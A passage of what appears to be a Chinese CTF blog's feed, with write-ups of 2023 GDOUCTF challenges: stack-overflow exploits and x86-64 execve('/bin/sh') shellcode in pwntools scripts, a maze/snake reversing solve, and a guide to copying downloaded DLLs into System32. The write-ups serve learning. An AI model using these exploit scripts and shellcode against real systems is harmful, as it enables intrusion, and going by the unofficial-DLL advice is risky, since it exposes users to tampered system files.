函数也是可以的</p></li><li><p>因此这个题有两种思路：<br>① 通过溢出 <code>s1</code> 修改 <code>v5</code> 的值，只要将 <code>v5</code> 改为非 0 值即可<br>② 通过溢出 <code>s1</code> 修改函数返回地址，使其直接跳转到 <code>print_flag()</code> 函数</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><ul><li>将 v5 的值修改为 1（或者其他非 0 值都可以）</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">-</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从s1到v5需要填充0x1F - 0x04个字节，p64(1)将v5修改为1</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><ul><li>直接将返回地址修改为 <code>print_flag()</code> 的地址<br>（<em>不过有一点不太明白，既然开启了 PIE 地址随机化，为什么还能直接得到 <code>print_flag()</code> 的真实地址</em>）</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>print_flag <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'print_flag'</span><span class="token punctuation">]</span>  <span class="token comment"># 通过elf获取ptint_flag()函数的地址</span><span class="token comment"># ptint_flag_addr = 0x0011D5  # 在IDA直接查看ptint_flag()函数的地址，两种方法都可以</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28291</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1F</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>print_flag<span class="token punctuation">)</span>        <span class="token comment"># payload = b'a' * (0x1F + 0x08) + p64(ptint_flag_addr)  # 两种方法都可以</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Password:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{2e00ef92-c970-45a0-b36e-2287f14151d5}</p></blockquote><p><img src="https://s2.loli.net/2023/04/20/wgbfU4FkQWDhuyH.png" alt="2023GDOUCTF-EASY_PWN7.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中一道简单的栈溢出类 pwn 题，虽然前面看起来像是让猜生成的随机数，其实与 flag 的获取关系并不大，不要被迷惑了</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-Shellcode</title>
    <link href="https://www.4ss1du0us.cn/2023/04be191c57.html"/>
    <id>https://www.4ss1du0us.cn/2023/04be191c57.html</id>
    <published>2023-04-20T07:36:01.000Z</published>
    <updated>2023-05-11T05:25:46.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>写入 <code>shellcode</code> 的时候，一定要注意可写入的空间的大小，有时生成的 <code>shellcode</code> 的长度会超出可写入空间</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-Shellcode</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>在 Ubuntu 下分析文件，并给予执行权限运行：<br><img src="https://s2.loli.net/2023/04/20/3PElLUwrNepDYSI.png" alt="2023GDOUCTF-ezshellcode1.png"><img src="https://s2.loli.net/2023/04/20/vpTmMq192XBPCFg.png" alt="2023GDOUCTF-ezshellcode2.png"></p></li><li><p>用 64 位 IDA 打开，定位到主函数：<br><img src="https://s2.loli.net/2023/04/20/AIVPJ4eyfOjZglQ.png" alt="2023GDOUCTF-ezshellcode3.png"><br>这里的 <code>name</code> 是写入到 <code>bss</code> 段上的，<code>buf</code> 写在栈上：<br><img src="https://s2.loli.net/2023/04/20/zMlsZ1WibqmFNK9.png" alt="2023GDOUCTF-ezshellcode4.png"><br>但是 <code>buf</code> 的栈只有 <code>0x0A</code> 的大小，可写入 <code>0x40</code> 的长度，所以存在栈溢出</p></li><li><p>于是思路就比较明确了：<br>① 通过 <code>name</code> 往 <code>bss</code> 段上写入 <code>shellcode</code><br>② 通过 <code>buf</code> 溢出，将跳转地址改为 <code>shellcode</code> 的地址，执行 <code>shellcode</code></p></li></ol><blockquote><p>虽然比赛时我的思路是对的，但是这个题有一点不一样<br><strong>因为 <code>name</code> 可以写入的大小只有 <code>0x25</code>，所以对 <code>shellcode</code> 的大小有一定的要求</strong><br><strong>使用 <code>pwntools</code> 生成的默认 <code>shellcode</code> 是不行的</strong></p></blockquote><ol start="4"><li>验证一下，例如使用 <code>pwntools</code> 生成默认 <code>shellcode</code>：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span><span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 0x30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>可以看到 <code>pwntools</code> 生成的默认 <code>shellcode</code> 长度为 <code>0x30</code> 长于可写入的长度 <code>0x25</code></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 在网上找到的两个比较短一点的 shellcode</span><span class="token comment"># 这样的 shellcode 长度只有 0x1e</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>于是用短的 <code>shellcode</code> 编写脚本即可</li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x06010A0</span>  <span class="token comment"># 查看IDA得到bss段上name的写入地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ezshellcode"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28073</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span>  <span class="token comment"># pwntools生成的默认shellcode超长，换一个短的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please.\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x0A</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Let's start!\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{612a3a24-b348-47fe-b86c-30d997ca26a5}</p></blockquote><p><img src="https://s2.loli.net/2023/04/20/Ohk4D9ByXcG67ML.png" alt="2023GDOUCTF-ezshellcode5.png"></p>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛中一道简单的 pwn 题，虽然是常规的 ret2shellcode，但是 pwntools 生成的 shellcode 超长确实没留意到，长个记性吧</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2023GDOUCTF-doublegame</title>
    <link href="https://www.4ss1du0us.cn/2023/045c478c43.html"/>
    <id>https://www.4ss1du0us.cn/2023/045c478c43.html</id>
    <published>2023-04-19T13:36:01.000Z</published>
    <updated>2023-05-11T05:23:29.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>解决 exe 由于缺少 DLL 文件导致无法运行的问题</mark></p></li><li><p>迷宫题，<mark>不过这个题有点小坑，对迷宫进行了改动，所以看到迷宫不要傻乎乎的直接复制粘贴，多看看代码里有没有对迷宫做修改</mark></p></li><li><p><mark>代码与程序输出结合分析，快速定位关键位置</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）2023GDOUCTF-doublegame</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 <code>doublegame.exe</code> 程序，运行发现是一个贪吃蛇游戏<br>（<strong>部分人可能像我一样，打开 exe 会弹出一个缺少 DLL 的错误，导致无法运行</strong>，<em>详见《运行程序遇到 “由于找不到 xxx.dll，无法继续执行代码”》</em>）<br><img src="https://s2.loli.net/2023/04/19/SQs39bpotfPcjhm.png" alt="2023GDOUCTF-doublegame1.png"><br><img src="https://s2.loli.net/2023/04/19/fTYoIsGKHZk4OlV.png" alt="2023GDOUCTF-doublegame5.png"><br>经过试验，后面蛇的速度会越来越快</p></li><li><p>用 64 位 IDA 打开，F5 反编译：<br><img src="https://s2.loli.net/2023/04/19/rugmUSZ62K5wMBR.png" alt="2023GDOUCTF-doublegame2.png"><br>但是什么都没有</p></li><li><p>由于没有 <code>main()</code> 函数，shift + F12 查看一下字符串，定位到关键位置：<br><img src="https://s2.loli.net/2023/04/19/Zp6zajMlvdnByGT.png" alt="2023GDOUCTF-doublegame3.png"><br><img src="https://s2.loli.net/2023/04/19/zAMyGeXLvcqBmDY.png" alt="2023GDOUCTF-doublegame4.png"><br>可以看到很多与 flag 有关的信息<br>① 首先最关键的一点，告诉了 flag 的形式是 <code>HZCTF&#123;md5(path)+score&#125;</code><br>② 注意下图，有一个由很多 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 组成的类似迷宫的东西，结合 <code>md5(path)</code> 可以大致推断 <code>path</code> 就是走迷宫的路径<br>③ 同时，还告诉了 <code>the first game tell the score</code>，结合文件名 <code>doublegame.exe</code> 可知，这个程序应该有两个游戏，第一个游戏是贪吃蛇，第二个游戏是走迷宫，贪吃蛇得到 <code>score</code>，走迷宫得到 <code>path</code></p></li><li><p>注意到字符串里的 <code>&quot;GAME OVER&quot;</code> 和 <code>&quot;?(y/n):&quot;</code> 与贪吃蛇游戏闯关失败时的输出有关，跟进函数位置：<br><img src="https://s2.loli.net/2023/04/19/VMKgeFtxdRIhNoD.png" alt="2023GDOUCTF-doublegame6.png"><br>根据 <code>sub_1400111F9(&quot;GAME OVER&quot;)</code> 可以推出 <code>sub_1400111F9()</code> 函数的功能是 <code>printf()</code><br>重命名一下，定位到关键 <code>if</code> 判断：<br><img src="https://s2.loli.net/2023/04/19/6z8ag2tImJcqhus.png" alt="2023GDOUCTF-doublegame7.png"><br>跟进上面两个红框中 <code>printf()</code> 的输出内容：<br><img src="https://s2.loli.net/2023/04/19/yxRacOL6zrChgfN.png" alt="2023GDOUCTF-doublegame8.png"><br>内容是十六进制数据，结合游戏的输出，这应该是输出的某些中文内容，最后 <code>%d</code> 是一个游戏中的数据<br>重点在后面的一个 <code>if</code> 判断：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> dword_140022CD0 <span class="token operator">></span> <span class="token number">13371337</span> <span class="token punctuation">)</span>  <span class="token function">sub_14001136B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_1400110E6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>首先，最后的 <code>sub_1400110E6()</code> 函数会执行 <code>sub_140012A40()</code> 用于在本地生成一个 <code>贪吃蛇最高得分记录.txt</code> 的文本文件：<br><img src="https://s2.loli.net/2023/04/19/zprqeYn36wHSitN.png" alt="2023GDOUCTF-doublegame9.png"><br>关键在于当 <code>dword_140022CD0 &gt; 13371337</code> 时，会执行 <code>sub_14001136B()</code> 函数<br><code>sub_14001136B()</code> 函数会执行 <code>sub_140012CF0()</code>：<br><img src="https://s2.loli.net/2023/04/19/Njz3bnwJAMF6vW4.png" alt="2023GDOUCTF-doublegame10.png"><br>这个函数用来生成迷宫的，以及 <code>switch()</code> 中的 <code>&#39;w&#39;</code>、<code>&#39;a&#39;</code>、<code>&#39;s&#39;</code>、<code>&#39;d&#39;</code> 用来控制方向<br>由于这是第二个游戏，明显 <code>dword_140022CD0 &gt; 13371337</code> 就是通关条件<br>（<strong>可能是游戏分数 <code>score &gt; 13371337</code> 就进入下一关，但是这里只是猜测，后面会验证，所以仅凭徒手玩游戏通关是几乎不可能的了</strong>）</p></li><li><p>将 <code>sub_140012CF0()</code> 函数提供的迷宫数据提取出来<br><mark>但是这里有个小坑，很重要，没有发现的话是做不出来的</mark>：<br><img src="https://s2.loli.net/2023/04/20/JRyd2xZrTGKvBgt.png" alt="2023GDOUCTF-doublegame12.png"><br>在上方的一堆 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 都是迷宫的内容，<mark>注意最后有一个 <code>v11[4] = 48</code>，48 是 <code>&#39;0&#39;</code> 的 ASCii 码</mark><br>找到 <code>v11</code> 的位置，也就是<mark>将 <code>@11111110101111111110</code>（为了看得更清楚，我把空格用 <code>&#39;1&#39;</code> 来表示） 这一行的第 5 个位置的空格改为 <code>&#39;0&#39;</code> 了</mark></p></li><li><p>提取出修改后的迷宫：<br>（<strong>这里有个小技巧：由于 <code>&#39;0&#39;</code> 表示墙壁，<code>&#39; &#39;</code> 表示路，可以在 Pycharm 中全选 <code>&#39; &#39;</code>，空格会有高亮，路径会更显眼</strong>）<br><img src="https://s2.loli.net/2023/04/19/lnfKSoLiR4tgMWJ.png" alt="2023GDOUCTF-doublegame11.png"><br>得到路径 <code>path</code>：<code>dddssssddwwwwddssddwwwwwwddddssaassddddwwwwddwwwwddd</code><br>MD5 加密后为：<code>811173b05afff098b4e0757962127eac</code></p></li><li><p>这里来分析一下，为什么是个走迷宫，具体信息是怎么样的<br>① 首先这里有个 <code>while</code> 循环，判断的是当前位置是否走到了出口，结合<code>（v15，v16）</code>是<code>（15，0）</code>对应 <code>&#39;@&#39;</code> 的位置，而<code>（v17，v18）</code>是<code>（7，20）</code>对应最后出口的那个点<br><img src="https://s2.loli.net/2023/04/19/dLpQo8istWO2UJy.png" alt="2023GDOUCTF-doublegame13.png"><br>② 再往下，注意到有一步操作会影响到后面的 <code>if</code> 条件，往左走的时候，如果当前位置是 <code>&#39;*&#39;</code> 的话，就将 <code>v7[20] = 48</code>，否则后面的 <code>if</code> 不会执行，而是输出 <code>&quot;error&quot;</code>，所以路径必须要经过 <code>&#39;*&#39;</code> 的位置<br><img src="https://s2.loli.net/2023/04/19/eycwlsiZQmEqSTn.png" alt="2023GDOUCTF-doublegame14.png"><br><img src="https://s2.loli.net/2023/04/19/m384wFGBCz9HpuJ.png" alt="2023GDOUCTF-doublegame15.png"><br>③ 最后，注意这个 <code>if</code> 条件<br><img src="https://s2.loli.net/2023/04/19/8HYVd2Fi4cAXDWa.png" alt="2023GDOUCTF-doublegame16.png"><br>函数 <code>sub_140011433(0)</code> 会执行 <code>sub_140011E10(unsigned int a1)</code>：<br><img src="https://s2.loli.net/2023/04/19/Ed915ZXtkaITlyR.png" alt="2023GDOUCTF-doublegame17.png"><br>根据形式，<code>sub_14001126C(&quot;%d&quot;, &amp;v2)</code> 应该是一个 <code>scanf()</code> 函数，让用户输入的 <code>v2</code> 就是 <code>key</code>，而前面又提示说 <code>the score is saving cat&#39;s key!\n</code> ，可以知道这个 <code>v2</code> 就是 <code>score</code></p></li><li><p>由于传参 <code>a1 = 0</code>，<code>v2</code> 初值为 0，最后返回 <code>v2</code> 的值，而 <code>sub_140011433(0)</code> 的返回值为 <code>v24</code>，且 <code>v24</code> 要等于 <code>13376013</code>，所以 <code>v2 = 0x1DC4 ^ 13376013</code><br><img src="https://s2.loli.net/2023/04/19/YPCcjquk4FaLpQV.png" alt="2023GDOUCTF-doublegame18.png"><br>最后得到 <code>v2 = 13371337</code>，<strong>验证了前面 <code>score &gt; 13371337</code> 就进入下一关的猜想</strong><br>于是得到 <code>score</code>：<code>13371337</code></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>NSSCTF{811173b05afff098b4e0757962127eac13371337}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote>]]></content>
    
    
    <summary type="html">2023 GDOUCTF 比赛的一道逆向题，是贪吃蛇和迷宫的结合，虽然不算难，但我觉得题目很有代表性，带点小坑，挺有意思的，记录一下</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>运行程序显示 “由于找不到 xxx.dll，无法继续执行代码”</title>
    <link href="https://www.4ss1du0us.cn/2023/0487826845.html"/>
    <id>https://www.4ss1du0us.cn/2023/0487826845.html</id>
    <published>2023-04-17T08:11:01.000Z</published>
    <updated>2023-05-11T05:27:36.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>在运行 <code>.exe</code> 程序时弹出 <code>&quot;由于找不到 xxx.dll，无法继续执行代码&quot;</code> 的错误，导致程序无法执行</p></blockquote><p><img src="https://s2.loli.net/2023/04/17/YcbuAzVI9PLhCpy.png" alt="由于找不到xxx.dll无法继续执行代码1.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>缺少必要的运行库文件，安装该 <code>.dll</code> 运行库文件即可</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol><li><p>在网上自行下载缺少的 <code>.dll</code> 文件，直接搜 <code>&quot;xxx.dll&quot;</code> 即可<br>（因为每个人缺少的运行库各不相同，无法提供统一的 DLL 文件，但是这些文件在网上都是可以下载到的，我这里提供一个下载 <code>.dll</code> 文件的网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a>）</p></li><li><p>我这里就以图片中所缺少的 <code>ucrtbased.dll</code> 为例。<em>通常来说，这样的 <code>.dll</code> 库文件我们需要下载两个，一个是 32 位的，一个是 64 位的</em></p></li><li><p>进入网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a><br>在搜索框中搜索 <code>ucrtbased.dll</code><br><img src="https://s2.loli.net/2023/04/17/ojO4g1YzKMpGFID.png" alt="由于找不到xxx.dll无法继续执行代码2.png"><br>往下翻，找到这个位置：<br><img src="https://s2.loli.net/2023/04/17/U5Hc7sbt8BOS6Qe.png" alt="由于找不到xxx.dll无法继续执行代码3.png"><br>有的 <code>.dll</code> 文件会有特别多的版本，不需要管，只需要看好架构（<code>Architecture</code>）即可<br><code>Architecture 64</code> 代表 64 位，<code>Architecture 32</code> 代表 32 位<br>将 <code>ucrtbased.dll</code> 的 64 位和 32 位文件各下载一个，版本（<code>Version</code>）随意，当然越新的版本自然越好</p></li><li><p>注意：<br><strong>一定要留意下载到本地的时候哪一个压缩包是 32 位的，哪一个压缩包是 64 位的，不要搞混了</strong><br>解压后，我这里以文件夹的命名来区分 32 位和 64 位，<strong>实际你下载的时候两个文件命名是相同的</strong><br><img src="https://s2.loli.net/2023/04/17/ftI2X3GpEYr5KhD.png" alt="由于找不到xxx.dll无法继续执行代码4.png"></p></li><li><p>首先了解一点基础知识：<br>在 64 位 的 Windows 系统中<br>放置 32 位 DLL 文件的默认路径为：<code>C:\Windows\SysWOW64\</code><br>放置 64 位 DLL 文件的默认路径为：<code>C:\Windows\System32\</code></p></li><li><p>于是，将 <code>ucrtbased_32 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\SysWOW64\</code> 路径下<br>将 <code>ucrtbased_64 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\System32\</code> 路径下</p></li><li><p>再次运行报错的 <code>.exe</code> 文件，观察问题是否解决<br>如果只是缺少 <code>ucrtbased.dll</code> 这一个 DLL 库文件，那么到此为止，程序基本就已经可以正常运行了<br>例如我再次打开刚刚报错的 exe 程序如下图：<br><img src="https://s2.loli.net/2023/04/17/5R3TBqsmQKvjbXk.png" alt="由于找不到xxx.dll无法继续执行代码5.png"></p></li><li><p><em>如果依然提示缺少其他的 DLL 文件，继续按此教程依次下载其他缺失的 DLL 文件即可</em></p></li></ol><blockquote><p>如果上述操作都试过了，但 exe 程序仍然无法运行<br>可能是因为 DLL 文件虽然复制到了目录下，但是并未注册，可以自行搜索注册 DLL 文件的教程，例如：<a href="https://jingyan.baidu.com/article/e75aca850f574c142edac6ee.html">如何注册dll文件-百度经验</a><br>（因为我没有遇到过，我按照上述操作就已经成功解决问题，所以无法提供教程，但是不排除有的人会遇到这种问题）</p></blockquote><hr>]]></content>
    
    
    <summary type="html">在打开 exe 程序时，弹出 “由于找不到 xxx.dll，无法继续执行代码” 致使程序无法运行的解决办法</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>VM虚拟机显示 “未能开启xxx.vmx”</title>
    <link href="https://www.4ss1du0us.cn/2023/04136f9f8e.html"/>
    <id>https://www.4ss1du0us.cn/2023/04136f9f8e.html</id>
    <published>2023-04-11T13:36:24.000Z</published>
    <updated>2023-05-11T05:27:31.755Z</updated>
    
